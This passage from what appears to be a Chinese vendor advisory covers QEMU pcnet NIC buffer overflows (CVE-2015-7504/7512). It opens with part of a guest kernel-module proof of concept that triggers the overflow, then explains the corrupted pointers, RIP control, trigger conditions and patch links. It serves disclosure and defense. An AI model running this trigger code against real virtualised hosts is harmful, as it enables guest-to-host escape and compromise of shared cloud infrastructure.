            struct pcnet_initblk32 *initblk;
            unsigned int oldval;
            vpacket=(unsigned char *)kmalloc(4096,0);
            memset(vpacket,0xdd,4096);
            ppacket=(unsigned char *)virt_to_phys(vpacket);
            vtmd=(unsigned char *)kmalloc(sizeof(struct pcnet_TMD),0);
            ptmd=(unsigned char *)virt_to_phys(vtmd);
            vinitblk=(unsigned char *)kmalloc(sizeof(struct pcnet_initblk32),0);
            pinitblk=(unsigned char *)virt_to_phys(vinitblk);
            memset(vinitblk,0x0,sizeof(struct pcnet_initblk32));
            initblk=(struct pcnet_initblk32*)vinitblk;
            initblk->tlen=0;
            initblk->tdra=(unsigned int)ptmd;
            initblk->rdra=(unsigned int)ptmd;//just enable recv
            //pcnet_s_reset()
            inw(0x14+PCNET);
            //set CSR_SPND
            oldval=read_csr(5);
            write_csr(5,oldval|0x1);
            //set CSR_IADR
            write_csr(1,(unsigned int)pinitblk&0xffff);
            write_csr(2,(unsigned int)pinitblk>>16);
            //pcnet_init()
            write_csr(0,0x1);
            //set CSR_XMTRL=1
            write_csr(0,0x4);
            write_csr(78,0x1);
            //set CSR_LOOP
            oldval=read_csr(15);
            write_csr(15,oldval|0x4);
            oldval=read_csr(15);
            //set CSR_PROM
            oldval=read_csr(15);
            write_csr(15,oldval|0x8000);
            //set BCR_SWSTYLE=1
            oldval=read_bcr(20);
            write_bcr(20,1+(oldval&~0xff));
            //clear CSR_SPND
            oldval=read_csr(5);
            write_csr(5,oldval&~0x1);
            //pcnet_start()
            write_csr(0,0x2);
            tmd=(struct pcnet_TMD*)vtmd;
            tmd->tbadr=(unsigned int)ppacket;
            tmd->length=0xf000;//packet length = 4096
            tmd->status=0x8300;
            tmd->misc=0x0;
            tmd->res=0x0;
            //pcnet_transmit()
            write_csr(0,0x8);
    }
    int init_module(void)
    {
            looptest_overflow();
            return 0;
    }
    void cleanup_module(void)
    {
    }
实际的攻击视频:
**  
**
**CVE-2015-7512**
**简介**
今年9月,360云安全团队安全研究员–刘令(Ling
Liu)向QEMU的安全团队提交了pcnet网卡模拟组件中的一个缓冲区溢出漏洞,经过确认后漏洞编号为CVE-2015-7504。该漏洞具备如下特性:
1\. 该漏洞在虚拟机收到数据包时直接触发,攻击构造条件难度中低
2\. 虚拟机所处环境需确保pcnet网卡能够接收到QEMU传递过来的大于4096长度的数据包。
3\. 利用该漏洞可以直接控制CPU的指令指针寄存器(Intel
X86体系为EIP或RIP),在未开启地址随机功能的宿主机系统上可以执行任意代码(即“虚拟机逃逸”)
4\. 配合特定反随机化技巧/漏洞攻击者可以在开启地址随机化保护功能的宿主操作系统上实现任意代码执行
**分析**
在配置了pcnet网卡的虚拟机启动时,pcnet_common_init会将pcnet_receive注册为该网卡收到数据包时的处理函数。当网卡收到数据包时,qemu_deliver_packet()会调用pcnet_receive,并传入数据包所在地址和大小。在网卡不为looptest模式时,pcnet_receive直接将数据包复制到PCNetState结构体的buffer[4096]中。
然而当网卡收到的数据包的长度大于4096时,超出的数据便会覆盖PCNetState结构中的irq、phys_mem_read、dma_opaque等。
攻击内存布局大致如下:
**触发途径**
由于系统中MTU的限制,通常的数据包长度不会达到4096以上。那么至少在以下两种情况下可以触发此漏洞:
配置pcnet的guest使用tap方式启动,该tap在host端的MTU要大于4096,则可由host发送大数据包即可触发漏洞。
guest启动时配有pcnet、e1000双网卡且处于同一vlan中,guest中e1000网卡的MTU要大于4096,则在guest中,通过e1000发送大数据包即可触发漏洞。
**漏洞演示**
启动qemu时pcnet为tap方式,配置IP使host与guest处于同一网段。在host端通过该tap发送raw
packet给pcnet网卡。gdb中显示s->irq、s->phys_mem_write等值被覆盖,当s->phys_mem_write被使用时,便可控制RIP,改变程序的执行流程。
**PoC**
发送raw
packet可使用[https://gist.github.com/austinmarton/1922600](https://gist.github.com/austinmarton/1922600)
实际的攻击视频:
**漏洞防护方案**
QEMU官方已经针对受以上两个漏洞影响的版本给出了补丁,请使用pcnet模块的QEMU-KVM或Xen平台用户,尽快选择对应的补丁进行安全升级。
[http://xenbits.xen.org/xsa/](http://xenbits.xen.org/xsa/)
[http://wiki.qemu.org/Main_Page](http://wiki.qemu.org/Main_Page)
目前确认360云不受此次漏洞影响。
**技术参考**
1\. 
2\. [https://code.google.com/p/google-security-research/issues/detail?id=395](https://code.google.com/p/google-security-research/issues/detail?id=395)
**关于360云**
360云成立于2014年12月31日,以“让企业安全用云”为使命,致力成为企业首选的安全云平台服务提供商。
360云将聚焦提供安全的云计算服务,凝聚资源隔离、数据加密、安全加固等数十种安全防护手段,打造行业第一安全云。
360云结合自身业务,发挥其在互联网领域的技术优势,为用户提供公有云、私有云服务,以及游戏云、视频直播云、智能云等行业解决方案。